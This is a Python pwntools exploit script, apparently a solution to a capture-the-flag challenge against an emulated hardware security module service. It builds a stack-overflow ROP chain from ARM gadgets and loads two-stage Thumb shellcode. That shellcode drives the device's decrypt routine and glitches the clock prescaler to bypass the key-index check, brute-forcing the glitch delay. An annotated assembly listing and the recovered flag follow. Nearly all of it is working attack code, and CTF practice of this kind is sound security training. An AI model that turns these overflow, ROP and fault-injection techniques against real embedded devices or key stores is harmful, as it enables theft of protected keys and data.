from pwn import *
import time
import binascii
import random

def recvuntil(bytes_str):
    print("< " + conn.recvuntil(bytes_str).decode("utf-8"))

def splitWords(bin_str):
    tab = []
    for a,b,c,d in zip(bin_str[::4],bin_str[1::4], bin_str[2::4], bin_str[3::4]):
        byte = (d << 24) + (c << 16) + (b<<8) + a
        tab.append(byte)
    return tab

def gen_payload(str_hex):
    payload_hex = str_hex.replace(" ","")
    while (len(payload_hex) % 16 != 0):
        payload_hex += "00"
    payload_bin = binascii.unhexlify(payload_hex)
    return splitWords(payload_bin)

def gen_payload_2(str_hex):
    payload_hex = str_hex.replace(" ","")
    return binascii.unhexlify(payload_hex)

def pad_params(str_bin):
    final_str_bin = str_bin
    while (len(final_str_bin) % 4 != 0):
        final_str_bin = final_str_bin + b' '
    return final_str_bin


ports = list(range(8001,8011,1))

garbage = p32(0)
gadget_R3_R4_R5_PC = p32(0x08000226 +1)
gadget_R4_R5_R6_R7_PC = p32(0x08000440 + 1)
socket = p32(0xE1000010)
R4_base_value = 0xE1001FD8
R4_0 = p32(R4_base_value)
R4_bis = p32(R4_base_value + 0x10)
verify_func = p32(0x0800046E + 1)

#str R5,[R3,#4]; pop {R3,R4,R5,PC}
gadget_write = p32(0x08000912 + 1)

##payload = gen_payload("26461878207003f1010304f101046d1ef7d106f10106B047")
#stage 1 shellcode: copy byte per byte
#R5: copy length
#R3: buf src
#R4: buf dst
#R6: buf dst +1 (shellcode 2 starting address)
payload_1 = gen_payload("26 46 18 78 20 70 03 F1 01 03 04 F1 01 04 6D 1E F7 D1 06 F1 01 06 B0 47")

#sram_adr: @to write the stage 1 payload
sram_adr = 0x20001000
gadget_R3_R4_R5_R6_R7_PC = p32(0x08000CA8 + 1)

#start filling the buffer
#PIN
s = b'\x31\x33\x33\x37\x32\x30\x32\x30' + b'\x00'
#bytes to decipher
s += b'\x19\x6b\xc5\x15\xf3\x9b\xa5\x41\xbe\xf8\xe0\xfb\x5e\x74\xc2\xcb'
s += b'\x2d\x00\x6e\xf5\xd1\x14\x50\xfc\x86\x03\x01\xa2\x65\xc8\xe6\x84' + b'\x00'

s = pad_params(s)
buf_base_adr = 0xe1001cd0

#@PIN, @bytesToDecipher
adr_list = [buf_base_adr, buf_base_adr + 9]

for adr in adr_list:
    s += p32(adr)

parameters_length = len(s)
adresses_offset = parameters_length - 4*3

#transmit decrypt command, transmit PIN string, read and check status
payload_2 = r"\x4f\xf0\x00\x64\x4f\xf0\x00\x55\x28\x46\x4f\xf0\x03\x01\x40\xf6\xfb\x06\x26\x44\xb0\x47\x28\x46\x00\x99\x4f\xf0\x08\x02\x40\xf6\x1d\x16\x26\x44\xb0\x47\x28\x46\x40\xf6\x37\x16\x26\x44\xb0\x47\x01\x28\x41\xf0\x00\x80"

#transmit key index 2
#simpler to set key index directly, instead of getting from the stack
payload_2 += r"\x28\x46\x4f\xf0\x02\x01\x40\xf6\xfb\x06\x26\x44\xb0\x47"
#transmit key index 1
#payload_2 += r"\x28\x46\x4f\xf0\x01\x01\x40\xf6\xfb\x06\x26\x44\xb0\x47"

##ADDING DELAY HERE !
payload_2 += r"\x05\x98\x41\xf2\x55\x06\x26\x44\xb0\x47"

# GLITCH !
payload_2 += r"\x4f\xf0\x80\x42\x02\xf5\x00\x32\x02\xf5\x60\x52\x93\x68\x19\x46\x83\xf0\xe0\x63\x93\x60\x91\x60"

#read response
payload_2 += r"\x28\x46\x40\xf6\x37\x16\x26\x44\xb0\x47\x01\x28\x41\xf0\x00\x80"
#integrated code for reading response
#payload_2 += r"\x28\x46\x43\x68\xd3\xf8\x04\x11\xd3\xf8\x00\x21\x91\x42\xf9\xd0\xd3\xf8\x04\x11\xd3\xf8\x00\x21\x91\x42\xf9\xd0\xd3\xf8\x04\x21\x98\x5c\xd3\xf8\x04\x21\x01\x32\xd2\xb2\xc3\xf8\x04\x21\x01\x28\x41\xF0\x00\x80"
#modified code for reading response (removed the two while loops)
#payload_2 += r"\x28\x46\x43\x68\xd3\xf8\x04\x11\xd3\xf8\x00\x21\x91\x42\x01\xf0\x00\x80\xd3\xf8\x04\x21\x98\x5c\xd3\xf8\x04\x21\x01\x32\xd2\xb2\xc3\xf8\x04\x21\x01\x28\x41\xf0\x00\x80"

#initialize loop counter
payload_2 += r"\x4f\xf0\x00\x07"

#transmit number of blocks to decipher
payload_2 += r"\x28\x46\x4f\xf0\x02\x01\x40\xf6\x00\x06\x06\xf1\xfb\x06\x26\x44\xb0\x47"

#start loop
#trasmit 16 bytes to decipher
payload_2 += r"\x28\x46\x01\x99\x39\x44\x4f\xf0\x10\x02\x40\xf6\x1d\x16\x26\x44\xb0\x47"
#receive rx_buf

payload_2 += r"\x28\x46\x02\x99\x4f\xf0\x10\x02\x40\xf6\x65\x16\x26\x44\xb0\x47"
#convert bytes to hex
payload_2 += r"\x02\x98\x4f\xf0\x10\x01\x03\x9a\x41\xf2\xad\x16\x26\x44\xb0\x47"

#print deciphered bytes
payload_2 += r"\x04\x98\x03\x99\x4f\xf0\x20\x02\x40\xf6\xa5\x66\x26\x44\xb0\x47"

#increment and test counter
payload_2 += r"\x07\xf1\x10\x07\x20\x2f"

#loop
payload_2 += r"\xda\xd1"

#print "\n"
payload_2 += r"\x04\x98\x40\xf2\x86\x36\x26\x44\xb0\x47"

#debug string to check if code execution arrived here
#payload_2 += r"\x41\xf2\xd4\x41\x21\x44\x04\x98\x41\xf2\x39\x06\x26\x44\xb0\x47"

payload_2 = gen_payload_2(payload_2.replace(r"\x",""))

s += payload_2 + b'a'*(0x300-parameters_length-len(payload_2)) + R4_0 + gadget_R3_R4_R5_PC

#the first value after the first gadget must not be modified! (socket)
s += socket + p32(0) + garbage + gadget_R3_R4_R5_PC

for i in range(len(payload_1)):
    s += p32(sram_adr+i*4-4) + garbage + p32(payload_1[i]) + gadget_write
    #gadget_write : finishing with POP {R3-R5,PC}

#R3: shellcode @
#R4: SRAM @
#R5: copy length
sram_adr_2 = 0x20001050
s += p32(0xe1001cd0 + parameters_length) + p32(sram_adr_2) + p32(len(payload_2)) + p32(sram_adr + 1) #gadget_R3_R4_R5_PC

#parameters: @PIN, @bytesToDecipher, @decipheredBytes, @decipheredMsg
s += p32(adr_list[0]) + p32(adr_list[1]) + p32(0x20002000) + p32(0x20003000)

R4_adjusted = 0xe1001cd0 + len(s) + 4*2
s += p32(R4_adjusted)

port_i = random.randrange(0,10,1)

#0x30 : minimum delay value for key index glitch
#bruteforce between [0x00 and 0xEE]
#for delay in range(0x30, 0xEE, 1):
flag = False
for delay in range(0x90, 0x96, 1):
    #flag for delay between 0x93 to 0x95, might require to test several times
    #delay = 0x94
    print("testing delay = 0x%02x" % delay)
    exit_loop = False

    while(not exit_loop):
        try:
            conn = remote('picohsm.donjon-ctf.io', ports[port_i])
            recvuntil(b'15 seconds...\n')
            exit_loop = True
        except EOFError:
            port_i = (port_i + 1) % 10
            time.sleep(1)

    final_test_payload = s + p32(delay)
    final_test_payload += socket + p32(0)

    conn.send(final_test_payload)
    print(conn.recvline(timeout=1).decode("utf-8"))
    resp = ""
    resp = conn.recvall(timeout=1).decode("utf-8")
    print(resp)

    if resp!= "":
        try:
            decoded = str(binascii.unhexlify(resp))[2:24]
            if "CTF" == decoded[:3]:
                print("WIN")
                print(decoded)
                flag = True
                break
        except:
            pass
        
    sleep(1)


#WIN !!!!!
#4354467b74317320625574206120736372347463687d00000000000000000000
#CTF{t1s bUt a scr4tch}

"""
using POP {R3-R5,PC} gadget to put R3, R4 and R5
R3: shellcode stack @                                           0xe1001CD0 + 52
R4: SRAM address, location where shellcode will be copied       0x20001100
R5: copy length

1st stage payload
MOV R6, R4          ; save shellcode location in R6
LDRB R0, [R3]       ; get byte to copy from src
STRB R0, [R4]       ; copy byte to dst
ADD R3, R3, #1      ; increment src@
ADD R4, R4, #1      ; increment dst@
SUBS R5, R5, #1     ; decrement length
BNE #-14            ; branch to => to LDRB (if length is >0, go to get byte to copy from src)
ADD R6, R6, #1      ; add 1 to jump address
BLX R6              ; jmp to shellcode 


MOV R6, R4          | 26 46
LDRB R0, [R3]       | 18 78
STRB R0, [R4]       | 20 70
ADD R3, R3, #1      | 03 F1 01 03
ADD R4, R4, #1      | 04 F1 01 04
SUBS R5, R5, #1     | 6D 1E
BNE #-14            | F7 D1
ADD R6, R6, #1      | 06 F1 01 06
BLX R6              | B0 47


#POP {R3-R5, PC}     | 38 BD

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

2nd stage payload: put params on the stack 

delay                               <<< SP + 0x14
R4_adjusted                         <<< SP + 0x10
@decipheredMsg                      <<< SP + 0xC
@decipheredBytes                    <<< SP + 8
buf_base_adr + 9: @bytesToDecipher  <<< SP + 4
buf_base_adr: @PIN                  <<< SP


TODO:
recode usart_rx(), and introduce a delay without the polling loops

parameters :
@PINstring
key_index_u32
msg_length
msg_to_decipher
socket

uart = 0x20000000
@PINstring
count               // to count multiple of 16 bytes
deciphered_bytes    
deciphered_msg

usart_tx(uart, 3);                   //transmit decrypt instruction
usart_tx_buf(uart, @PINstring, 8);    //transmit PIN string
r = usart_rx(uart);                   //receive response

if (r == 1) {
    usart_tx(uart, key_index_u32)    //transmit key index
    delay(X);                        // <<<--- add delay here!
    r = usart_rx(uart)               //receive response
    if (r == 1) {
        usart_tx(uart, msg_length//16);  //transmit number of blocks to decipher
        count = 0;
        while (count < msg_length) {
            usart_tx_buf(uart, msg_to_decipher + count, 0x10);   //send the block to decipher, 16 per 16
            usart_rx_buf(uart, @deciphered_bytes, 0x10);         //read the deciphered block
            bytes_to_hex(deciphered_bytes@, 0x10, @deciphered_msg);     //convert deciphered bytes to hex string
            socket_write(&socket, @deciphered_msg, 0x20);               //print hex string (32 bytes)
            count += 16;                                                //increment the counter by 16 bytes
        }
        str = "\n";
        socket_print(&socket, str);
    } else {
        Error();
    }
} else {

    Error();
}

#### ARM code

#init R4 and R5, they won't be modified
MOV R4, #0x08000000
MOV R5, #0x20000000

#transmit decrypt command
MOV R0, R5 
MOV R1, #3
MOV R6, #0x08FB
ADD R6, R6, R4
BLX R6

#transmit PIN string
MOV R0, R5
LDR R1, [SP]
MOV R2, #8
MOV R6, #0x091D
ADD R6, R6, R4
BLX R6

#read status
MOV R0, R5
MOV R6, #0x0937
ADD R6, R6, R4
BLX R6
CMP R0, #1
BNE #0x1000

#transmit key index
#R1 stores the key index
MOV R0, R5 
MOV R1, #2          
MOV R6, #0x08FB
ADD R6, R6, R4
BLX R6

#call delay(), with parameter put on the stack at [SP,#0x14]
LDR R0, [SP, #0x14]
MOV R6, #0x1055
ADD R6, R4
BLX R6

##glitch !
MOV R2, #0x40000000         
ADD R2, R2, #0x20000        
ADD R2, R2, #0x3800                ; reused and adapted from existing code :D
LDR R3, [R2, #8]                   ; retrieve RCC.CFGR current value in R3
MOV R1, R3                         ; store the current value in R1
EOR R3, R3, #0x7000000             ; set the modified value in R3
STR R3, [R2, #8]                   ; modify the prescaler <<< glitch
;;; if needed, add some NOP here
STR R1, [R2, #8]                   ; restore the initial value


#receive response
MOV R0, R5
MOV R6, #0x937
ADD R6, R6, R4
BLX R6
CMP R0, #3
BNE #0x1000

#initialize loop counter
MOV R7, #0

#transmit number of blocks to decipher
MOV R0, R5
MOV R1, #2
MOV R6, #0x800
ADD R6, R6, #0xFB
ADD R6, R6, R4
BLX R6

#start loop
#transmit 16 bytes to decipher
MOV R0, R5
LDR R1, [SP, #4]
ADD R1, R1, R7
MOV R2, #0x10
MOV R6, #0x091D
ADD R6, R6, R4
BLX R6

#receive rx_buf
MOV R0, R5
LDR R1, [SP, #0x8]
MOV R2, #0x10
MOV R6, #0x0965
ADD R6, R6, R4
BLX R6

#convert bytes to hex
LDR R0, [SP, #0x8]
MOV R1, #0x10
LDR R2, [SP, #0xC]
MOV R6, #0x11AD
ADD R6, R6, R4
BLX R6

#print deciphered bytes
LDR R0, [SP, #0x10]
LDR R1, [SP, #0x0C]
MOV R2, #0x20
MOV R6, 0x0EA5
ADD R6, R6, R4
BLX R6

#increment and test counter
ADD R7, R7, #0x10
CMP R7, #0x20

#go to start loop 
BNE #0xffffffb8

#print "\n"
ldr  r0, [sp, #0x10]
MOV  R6, #0x386
ADD  R6, R4
BLX  R6


#debug code (print string) to check if code execution arrived here
MOV R1, #0x14D4
ADD R1, R1, R4
LDR R0, [SP, #0x10]
MOV R6, #0x1039
ADD R6, R6, R4
BLX R6

#####################

#command to glitch:
#decrypt 13372020 2 196bc515f39ba541bef8e0fb5e74c2cb2d006ef5d11450fc860301a265c8e684

"""